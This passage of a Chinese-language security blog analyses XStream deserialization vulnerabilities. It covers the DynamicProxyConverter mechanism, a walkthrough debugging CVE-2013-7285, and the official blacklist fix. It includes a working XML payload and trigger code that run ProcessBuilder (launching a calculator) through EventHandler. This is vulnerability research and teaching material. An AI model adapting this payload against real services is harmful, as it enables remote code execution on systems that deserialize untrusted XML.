+                <span class="token class-name">Object</span> var7 <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">applyGetters</span><span class="token punctuation">(</span>var3<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getEventPropertyName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
+                var6 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>var7<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>  
+                var5 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>var7 <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">?</span> <span class="token keyword">null</span> <span class="token operator">:</span> var7<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>  
+            <span class="token punctuation">&#125;</span>  
+<span class="token comment">//------------------------------------------------------------------------------  </span>
+            <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>  
+                <span class="token keyword">int</span> var12 <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>action<span class="token punctuation">.</span><span class="token function">lastIndexOf</span><span class="token punctuation">(</span><span class="token number">46</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
+                <span class="token keyword">if</span> <span class="token punctuation">(</span>var12 <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  
+                    <span class="token keyword">this</span><span class="token punctuation">.</span>target <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">applyGetters</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>target<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>action<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> var12<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
+                    <span class="token keyword">this</span><span class="token punctuation">.</span>action <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>action<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span>var12 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
+                <span class="token punctuation">&#125;</span>  
+<span class="token comment">//--------------------------------------part3----------------------------------------  </span>
+<span class="token comment">//var13获取了method的名称, var13=public java.lang.Process java.lang.ProcessBuilder.start() throws java.io.IOException  </span>
+                <span class="token class-name">Method</span> var13 <span class="token operator">=</span> <span class="token class-name">Statement</span><span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>target<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>action<span class="token punctuation">,</span> var5<span class="token punctuation">)</span><span class="token punctuation">;</span>  
+<span class="token comment">//--------------------------------------------------------------------------  </span>
+<span class="token comment">//判断var13是否为空,当然不为空啦  </span>
+                <span class="token keyword">if</span> <span class="token punctuation">(</span>var13 <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  
+                    var13 <span class="token operator">=</span> <span class="token class-name">Statement</span><span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>target<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"set"</span> <span class="token operator">+</span> <span class="token class-name">NameGenerator</span><span class="token punctuation">.</span><span class="token function">capitalize</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>action<span class="token punctuation">)</span><span class="token punctuation">,</span> var5<span class="token punctuation">)</span><span class="token punctuation">;</span>  
+                <span class="token punctuation">&#125;</span>  
+  
+                <span class="token keyword">if</span> <span class="token punctuation">(</span>var13 <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  
+                    <span class="token class-name">String</span> var9 <span class="token operator">=</span> var5<span class="token punctuation">.</span>length <span class="token operator">==</span> <span class="token number">0</span> <span class="token operator">?</span> <span class="token string">" with no arguments"</span> <span class="token operator">:</span> <span class="token string">" with argument "</span> <span class="token operator">+</span> var5<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  
+                    <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">RuntimeException</span><span class="token punctuation">(</span><span class="token string">"No method called "</span> <span class="token operator">+</span> <span class="token keyword">this</span><span class="token punctuation">.</span>action <span class="token operator">+</span> <span class="token string">" on "</span> <span class="token operator">+</span> <span class="token keyword">this</span><span class="token punctuation">.</span>target<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> var9<span class="token punctuation">)</span><span class="token punctuation">;</span>  
+                <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>  
+<span class="token comment">//-------------------------------------part4----------------------------------  </span>
+<span class="token comment">//调用invoke,调用函数,执行命令  </span>
+                    <span class="token keyword">return</span> <span class="token class-name">MethodUtil</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>var13<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>target<span class="token punctuation">,</span> var6<span class="token punctuation">)</span><span class="token punctuation">;</span>  
+                <span class="token punctuation">&#125;</span>  
+<span class="token comment">//------------------------------------------------------------------------------  </span>
+            <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IllegalAccessException</span> var10<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  
+                <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">RuntimeException</span><span class="token punctuation">(</span>var10<span class="token punctuation">)</span><span class="token punctuation">;</span>  
+            <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">InvocationTargetException</span> var11<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  
+                <span class="token class-name">Throwable</span> var8 <span class="token operator">=</span> var11<span class="token punctuation">.</span><span class="token function">getTargetException</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
+                <span class="token keyword">throw</span> var8 <span class="token keyword">instanceof</span> <span class="token class-name">RuntimeException</span> <span class="token operator">?</span> <span class="token punctuation">(</span><span class="token class-name">RuntimeException</span><span class="token punctuation">)</span>var8 <span class="token operator">:</span> <span class="token keyword">new</span> <span class="token class-name">RuntimeException</span><span class="token punctuation">(</span>var8<span class="token punctuation">)</span><span class="token punctuation">;</span>  
+            <span class="token punctuation">&#125;</span>  
+        <span class="token punctuation">&#125;</span>  
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>有一说一看到这里的时候，就感觉 XStream 可能比较多的会通过动态代理作为 sink</p>
+<h4 id="DynamicProxyConverter-动态代理转换器"><a href="#DynamicProxyConverter-动态代理转换器" class="headerlink" title="DynamicProxyConverter 动态代理转换器"></a>DynamicProxyConverter 动态代理转换器</h4><p>DynamicProxyConverter 即动态代理转换器，是 XStream 支持的一种转换器，其存在使得 XStream 能够把 XML 内容反序列化转换为动态代理类对象：</p>
+<img src="/2023/04/18/Java-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-XStream-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-01/DynamicProxyConverter.png" class="">
+
+<p>XStream 反序列化漏洞的 PoC 都是以 <code>DynamicProxyConverter</code> 这个转换器为基础来编写的。</p>
+<p>以官网给的例子为例：</p>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dynamic-proxy</span><span class="token punctuation">></span></span>  
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>interface</span><span class="token punctuation">></span></span>com.foo.Blah<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>interface</span><span class="token punctuation">></span></span>  
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>interface</span><span class="token punctuation">></span></span>com.foo.Woo<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>interface</span><span class="token punctuation">></span></span>  
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>handler</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>com.foo.MyHandler<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>something</span><span class="token punctuation">></span></span>blah<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>something</span><span class="token punctuation">></span></span>  
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>handler</span><span class="token punctuation">></span></span>  
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dynamic-proxy</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>dynamic-proxy 标签在 XStream 反序列化之后会得到一个动态代理类对象，当访问了该对象的<code>com.foo.Blah</code> 或 <code>com.foo.Woo</code> 这两个接口类中声明的方法时（即 interface 标签内指定的接口类），就会调用 handler 标签中的类方法 <code>com.foo.MyHandler</code></p>
+<h2 id="0x02-CVE-2013-7285"><a href="#0x02-CVE-2013-7285" class="headerlink" title="0x02 CVE-2013-7285"></a>0x02 CVE-2013-7285</h2><p><strong>PoC</strong></p>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>sorted-set</span><span class="token punctuation">></span></span>  
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dynamic-proxy</span><span class="token punctuation">></span></span>  
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>interface</span><span class="token punctuation">></span></span>java.lang.Comparable<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>interface</span><span class="token punctuation">></span></span>  
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>handler</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>java.beans.EventHandler<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  
+      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>target</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>java.lang.ProcessBuilder<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  
+        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>command</span><span class="token punctuation">></span></span>  
+          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>string</span><span class="token punctuation">></span></span>Calc<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>string</span><span class="token punctuation">></span></span>  
+        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>command</span><span class="token punctuation">></span></span>  
+      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>target</span><span class="token punctuation">></span></span>  
+      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>action</span><span class="token punctuation">></span></span>start<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>action</span><span class="token punctuation">></span></span>  
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>handler</span><span class="token punctuation">></span></span>  
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dynamic-proxy</span><span class="token punctuation">></span></span>  
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>sorted-set</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>看到 PoC 这里大致是明白了，在之前有一段代码是读取每一个 XML 的节点，读取这些节点之后应该是用动态代理触发 <code>invoke()</code> 了</p>
+<p><strong>触发代码</strong></p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>thoughtworks<span class="token punctuation">.</span>xstream<span class="token punctuation">.</span></span><span class="token class-name">XStream</span></span><span class="token punctuation">;</span>  
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>thoughtworks<span class="token punctuation">.</span>xstream<span class="token punctuation">.</span>io<span class="token punctuation">.</span>xml<span class="token punctuation">.</span></span><span class="token class-name">DomDriver</span></span><span class="token punctuation">;</span>  
+  
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">FileInputStream</span></span><span class="token punctuation">;</span>  
+  
+<span class="token comment">// CVE_2013_7285 Exploit  </span>
+<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">CVE_2013_7285</span> <span class="token punctuation">&#123;</span>  
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span><span class="token punctuation">&#123;</span>  
+        <span class="token class-name">FileInputStream</span> fileInputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span><span class="token string">"G:\\OneDrive - yapuu\\Java安全学习\\JavaSecurityLearning\\JavaSecurity\\XStream\\XStream\\XStream-Basic\\src\\main\\java\\person.xml"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
+        <span class="token class-name">XStream</span> xStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">DomDriver</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
+        xStream<span class="token punctuation">.</span><span class="token function">fromXML</span><span class="token punctuation">(</span>fileInputStream<span class="token punctuation">)</span><span class="token punctuation">;</span>  
+    <span class="token punctuation">&#125;</span>  
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>XStream 反序列化漏洞的存在是因为 XStream 支持一个名为 <code>DynamicProxyConverter</code> 的转换器，该转换器可以将 XML 中 <code>dynamic-proxy</code> 标签内容转换成动态代理类对象，而当程序调用了 <code>dynamic-proxy</code> 标签内的 <code>interface</code> 标签指向的接口类声明的方法时，就会通过动态代理机制代理访问 <code>dynamic-proxy</code> 标签内 <code>handler</code> 标签指定的类方法。</p>
+<p>利用这个机制，攻击者可以构造恶意的XML内容，即 <code>dynamic-proxy</code> 标签内的 <code>handler</code> 标签指向如 <code>EventHandler</code> 类这种可实现任意函数反射调用的恶意类、<code>interface</code> 标签指向目标程序必然会调用的接口类方法；最后当攻击者从外部输入该恶意 XML 内容后即可触发反序列化漏洞、达到任意代码执行的目的。</p>
+<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>下断点调试一下，这里前面的流程和分析 XStream 流程是类似的，会调用<code>HierarchicalStreams.readClassType()</code> 来获取到 PoC XML 中根标签的类类型</p>
+<img src="/2023/04/18/Java-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-XStream-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-01/readClassTypeCVE.png" class="">
+
+<p>后面会跟进到 <code>mapper.realClass()</code> 进行循环遍历，用来查找 XML 中的根标签为何类型（前面也都分析过了），接着是调用 <code>convertAnother()</code> 函数对 <code>java.util.SortedSet</code> 类型进行转换，我们跟进去该函数，其中调用 <code>mapper.defaultImplementationOf()</code> 函数来寻找 <code>java.util.SortedSet</code> 类型的默认实现类型进行替换，这里转换为了 <code>java.util.TreeSet</code> 类型</p>
+<img src="/2023/04/18/Java-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-XStream-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-01/defaultImplementationOf.png" class="">
+
+<p>接着就是寻找 Convert 的过程，这里寻找到对应的转换器是 <code>TreeMapConverter</code> 转换器</p>
+<img src="/2023/04/18/Java-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-XStream-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-01/ConvertValues.png" class="">
+
+<p>往下调试，在 <code>AbstractReferenceUnmarshaller.convert()</code> 函数中看到，会调用 <code>getCurrentReferenceKey()</code> 来获取当前的 Reference 键，并且会将当前的 Reference 键压到栈中，这个 Reference 键后续会和保存的类型 —— <code>java.util.TreeSet</code> 类一一对应起来。</p>
+<img src="/2023/04/18/Java-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-XStream-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-01/convertReference.png" class="">
+
+<p>接着调用其父类即的 <code>FastStack.convert()</code> 方法，跟进去，显示将类型压入栈，然后调用转换器 TreeSetConverter 的 <code>unmarshal()</code> 方法：</p>
+<img src="/2023/04/18/Java-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-XStream-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-01/convertPush.png" class="">
+
+<p>在它第 61 行调用了 <code>treeMapConverter.unmarshalComparator()</code> 方法，这个方法获取到了第二个 XML 节点元素，这个方法当时漏看了，这个方法还是比较重要的，它获取到了 xml 根元素的子元素。</p>
+<p>跟进之后就变得一目了然了，其中判断 <code>reader</code> 是否还有子元素</p>
+<img src="/2023/04/18/Java-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-XStream-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-01/hasMoreChildren.png" class="">
+
+<p>下面的 <code>reader.movedown()</code> 方法做了获取子元素，并把子元素添加到当前 context 的 pathTracker</p>
+<img src="/2023/04/18/Java-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-XStream-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-01/moveDown.png" class="">
+
+<p>往下调试，在 <code>TreeSetConverter.unmarshal()</code> 方法中调用了 <code>this.treeMapConverter.populateTreeMap()</code>，从这个方法开始，XStream 开始处理了 XML 里面其他的节点元素。跟进该函数，先判断是否是第一个元素，是的话就调用 <code>putCurrentEntryIntoMap()</code>函数，即将当前内容缓存到 Map 中：</p>
+<img src="/2023/04/18/Java-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-XStream-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-01/JudgeElement.png" class="">
+
+<p>跟进去，发现调用 <code>readItem()</code> 方法读取标签内的内容并缓存到当前 Map 中</p>
+<img src="/2023/04/18/Java-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-XStream-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-01/readItem.png" class="">
+
+<p>这里再跟进 <code>readItem()</code> 方法，会发现比较有意思的一点是它又调用了 <code>HierarchicalStreams.readClassType()</code> 和 <code>context.convertAnother()</code> 方法，而这里的元素已经变成了第二个元素，也就是 <code>&lt;dynamic-proxy&gt;</code>，这里有点像是递归调用</p>
+<p>可以跟进去看一下，这里通过查看 <code>mapper</code> 可以知道目前拿去保存在 mapper 当中的还是两个元素，而 XStream 的处理，则会处理最新的一个（最里层的一个）</p>
+<img src="/2023/04/18/Java-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-XStream-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-01/littleNode.png" class="">
+
+<p>经过处理之后返回的 type 就为最新的一个子元素的类型，这里是 <code>com.thoughtworks.xstream.mapper.DynamicProxyMapper$DynamicProxy</code>，对应的转换器为 <code>DynamicProxyConverter</code>，跟进到其中来看具体处理。</p>
+<p>先判断当前元素是否还有子元素，并获取该子元素进行后续判断</p>
+<p>根据我们所编写的 xml，获取到的子元素为 <code>&lt;interface&gt;</code>，经过判断 <code>if (elementName.equals(&quot;interface&quot;))</code>，如果为 true，则将目前 <code>&lt;interface&gt;</code> 节点的元素获取到，再获得转换类型。</p>
+<img src="/2023/04/18/Java-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-XStream-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-01/ifInterface.png" class="">
+
+<p>因为仍旧存在子元素，获取完 <code>&lt;interface&gt;</code> 后重新进入这个迭代，下一个获取到的子元素是 <code>&lt;handler&gt;</code>。这里程序会判断是否等于 handler，如果等于 handler，则获取它标签所对应的类，并跳出迭代。</p>
+<img src="/2023/04/18/Java-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-XStream-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-01/handler.png" class="">
+
+<p>往下走，第 125 行调用了 <code>Proxy.newProxyInstance()</code> 方法，这里是动态代理中的，实例化代理类的过程。第 127 行这里，调用 <code>context.convertAnother()</code> 方法，跟进一下。对应的转换器是 <code>AbstractReflectionConverter</code>，它会先调用 <code>instantiateNewInstance()</code> 方法实例化一个 <code>EventHandler</code> 类</p>
+<img src="/2023/04/18/Java-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-XStream-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-01/AbstractReflectionConverter.png" class="">
+
+<p>往下，跟进 <code>doUnmarshal()</code> 方法，这里又是一层内部递归，从 xml 中可以看到 <code>&lt;handler&gt;</code> 节点之下还有很多子节点（又看到了熟悉的 <code>hasChildren()</code></p>
+<img src="/2023/04/18/Java-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-XStream-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-01/smilar.png" class="">
+
+<p>这时我们获取到的 type 为 <code>class java.lang.ProcessBuilder</code>，跟进 <code>unmarshallField()</code> 方法</p>
+<img src="/2023/04/18/Java-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-XStream-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-01/unmarshallField.png" class="">
+
+<p>后面也都是类似的运行流程了，这里就不再废话，师傅们可以自行分析一下，是很容易看懂的；XSteam 虽然处理了 xml，且我们也基本明白了基础运行流程，但是最后漏洞触发这里还是要关注一下。</p>
+<p>将所有的节点过完一遍之后，最终还是会走到 <code>treeMapConverter.populateTreeMap()</code> 这个地方</p>
+<img src="/2023/04/18/Java-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-XStream-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-01/populateTreeMapEnd.png" class="">
+
+<p>跟进，直到第 122 行，调用 <code>put.All()</code> 方法，里面的变量为 sortedMap，查看一下它的值可以发现这是一串链式存储的数据</p>
+<img src="/2023/04/18/Java-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-XStream-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-01/sortedMap.png" class="">
+
+<p>最终是调用到 <code>EventHandler.invoke()</code> 方法调用栈如下，还是比较简单的</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java">invoke<span class="token operator">:</span><span class="token number">428</span><span class="token punctuation">,</span> <span class="token class-name">EventHandler</span> <span class="token punctuation">(</span>java<span class="token punctuation">.</span>beans<span class="token punctuation">)</span>
+compareTo<span class="token operator">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> $<span class="token class-name">Proxy0</span> <span class="token punctuation">(</span>com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>proxy<span class="token punctuation">)</span>
+compare<span class="token operator">:</span><span class="token number">1294</span><span class="token punctuation">,</span> <span class="token class-name">TreeMap</span> <span class="token punctuation">(</span>java<span class="token punctuation">.</span>util<span class="token punctuation">)</span>
+put<span class="token operator">:</span><span class="token number">538</span><span class="token punctuation">,</span> <span class="token class-name">TreeMap</span> <span class="token punctuation">(</span>java<span class="token punctuation">.</span>util<span class="token punctuation">)</span>
+putAll<span class="token operator">:</span><span class="token number">281</span><span class="token punctuation">,</span> <span class="token class-name">AbstractMap</span> <span class="token punctuation">(</span>java<span class="token punctuation">.</span>util<span class="token punctuation">)</span>
+putAll<span class="token operator">:</span><span class="token number">327</span><span class="token punctuation">,</span> <span class="token class-name">TreeMap</span> <span class="token punctuation">(</span>java<span class="token punctuation">.</span>util<span class="token punctuation">)</span>
+populateTreeMap<span class="token operator">:</span><span class="token number">122</span><span class="token punctuation">,</span> <span class="token class-name">TreeMapConverter</span> <span class="token punctuation">(</span>com<span class="token punctuation">.</span>thoughtworks<span class="token punctuation">.</span>xstream<span class="token punctuation">.</span>converters<span class="token punctuation">.</span>collections<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>最后成功调用了 <code>java.lang.ProcessBuilder#start</code> 方法，命令执行</p>
+<img src="/2023/04/18/Java-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-XStream-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-01/Calc.png" class="">
+
+<h2 id="0x03-漏洞修复"><a href="#0x03-漏洞修复" class="headerlink" title="0x03 漏洞修复"></a>0x03 漏洞修复</h2><p>根据官方的修复手段，这里其实增加了黑名单</p>
+<p>Users can register an own converter for dynamic proxies, the <em>java.beans.EventHandler</em> type or for the <em>java.lang.ProcessBuilder</em> type, that also protects against an attack for this special case:</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java">xstream<span class="token punctuation">.</span><span class="token function">registerConverter</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Converter</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+  <span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">canConvert</span><span class="token punctuation">(</span><span class="token class-name">Class</span> type<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">return</span> type <span class="token operator">!=</span> <span class="token keyword">null</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>type <span class="token operator">==</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>beans<span class="token punctuation">.</span></span>EventHandler</span> <span class="token operator">||</span> type <span class="token operator">==</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>ProcessBuilder</span> <span class="token operator">||</span> <span class="token class-name">Proxy</span><span class="token punctuation">.</span><span class="token function">isProxy</span><span class="token punctuation">(</span>type<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token punctuation">&#125;</span>
+
+  <span class="token keyword">public</span> <span class="token class-name">Object</span> <span class="token function">unmarshal</span><span class="token punctuation">(</span><span class="token class-name">HierarchicalStreamReader</span> reader<span class="token punctuation">,</span> <span class="token class-name">UnmarshallingContext</span> context<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">ConversionException</span><span class="token punctuation">(</span><span class="token string">"Unsupported type due to security reasons."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token punctuation">&#125;</span>
+
+  <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">marshal</span><span class="token punctuation">(</span><span class="token class-name">Object</span> source<span class="token punctuation">,</span> <span class="token class-name">HierarchicalStreamWriter</span> writer<span class="token punctuation">,</span> <span class="token class-name">MarshallingContext</span> context<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
